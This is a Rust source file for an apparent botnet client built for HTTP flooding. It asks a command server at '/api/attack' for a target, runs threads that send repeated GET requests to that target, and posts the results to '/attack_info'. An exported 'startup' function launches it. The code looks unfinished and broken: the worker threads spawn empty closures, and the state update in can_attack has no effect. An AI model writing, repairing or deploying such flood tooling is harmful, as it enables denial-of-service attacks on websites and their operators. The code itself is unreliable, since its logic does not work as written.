use std::cell::{Cell, Ref, RefCell};
use serde_json;
use std::sync::{Arc, Condvar};
use shared_mutex::SharedMutex;
use std::time;
use dashmap::DashMap;

struct Client {
    host_address: String,
    attack_data: Arc<(SharedMutex<(bool, String)>, Condvar)>,
    worker_threads: Vec<std::thread::JoinHandle<()>>,
    results: Arc<DashMap<u32, Vec<String>>>,
    thread_count: usize,
}




//client methods
impl Client {
    //constructor
    fn new(host: String) -> Client {
        let thread_count = std::thread::available_parallelism().unwrap().get();
        let mut cl = Client {
            host_address: host,
            attack_data:Arc::new((SharedMutex::new((false, String::new())), Condvar::new())),
            worker_threads: vec![],
            results: Arc::new(DashMap::with_capacity(thread_count)),
            thread_count,
        };
        cl.worker_threads.reserve(thread_count);
        for i in 0..thread_count {
            cl.results.insert(i as u32, vec![]);
        }
        return cl;
    }

    //checks if the server can attack, if it can, it notifies the workers
    fn can_attack(&self){
        // sends request to the server to check if it can attack
        let url = self.host_address.as_str();
        //parses the result
        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1].to_string();
        let mut can_attack = !attack_address_url.is_empty();
        let (lock, cv) = &*self.attack_data;
        let mut wlock = lock.write().unwrap();
        let (mut attacking, mut address) = &*wlock;
        address = attack_address_url;
        attacking = can_attack;
        match attacking {
            true => cv.notify_all(),
            false => ()
        };
    }

    fn start_requesting(&self, client: reqwest::blocking::Client, id:u32, address: &str){
            let result = client.get(address).send();
            return match result {
                Ok(_) => {
                    let res = result.unwrap();
                    let code = res.status().as_u16().to_string();
                    let body = res.text().unwrap();
                    let response_body = serde_json::json!({"code": code, "body":body});
                    let local_instance = self.results.clone();
                    local_instance.get_mut(&id).unwrap().push(response_body.to_string());
                }
                Err(_) => {}
            };
    }

    fn thread_worker(&self, id: u32) {
        let client = reqwest::blocking::Client::new();
        let (lock, cv) = &*self.attack_data;
        //infinite loop todo make it stoppable by some signal
        loop {
            //locks the mutex (no need to check if it's ok)
            let mut pair = lock.read().unwrap();
            let (attacking, address) = &*pair;
            //sleep if the worker is not attacking
            if !attacking {
                pair = pair.wait_for_read(cv).unwrap();
            }
            let mut _r = 0;
            for _ in 0..100 {
                self.start_requesting(client.clone(), id, address.as_str());
            }
        }
    }


    //main function, starts the threads and the attack and collects info
    fn run(mut self) {
        for i in 0..self.thread_count {
            //clones the smart pointer to have it's own copy, and sends it to the thread
            let ind = i.to_owned().clone();
            self.worker_threads.push(std::thread::spawn(move || {
                ();
            }));
        }
        self.can_attack();
        let addr = self.host_address.to_owned().clone();
        let armap = self.results.to_owned().clone();
        let handl = std::thread::spawn(move || {
            let time = time::Duration::from_millis(950);
            let cl = reqwest::blocking::Client::new();
            let map = &*armap;
            loop {
                std::thread::sleep(time);
                let mut request_body_vec = Vec::new();
                for el in map.iter() {
                    request_body_vec.extend(el.value().to_owned());
                }
                println!("Throughput: {}", request_body_vec.len());
                if request_body_vec.len() >= 20 {
                    cl.post(format!("{}/attack_info", addr.to_owned().clone())).json(&request_body_vec).send().unwrap();
                    map.alter_all(|_, mut v| {
                        v.clear();
                        v
                    });
                }
            }
        });
        //checks if the server can attack
        // loop {
        //     self.can_attack();
        // }
        //waits for the thread to finish todo make it finishable by some signal
        handl.join().unwrap();
        while self.worker_threads.len() > 0 {
            let thread = self.worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }
}


#[no_mangle]
pub extern "C" fn startup() {
    let cl = Client::new(String::from("http://localhost:8080"));
    cl.run();
}
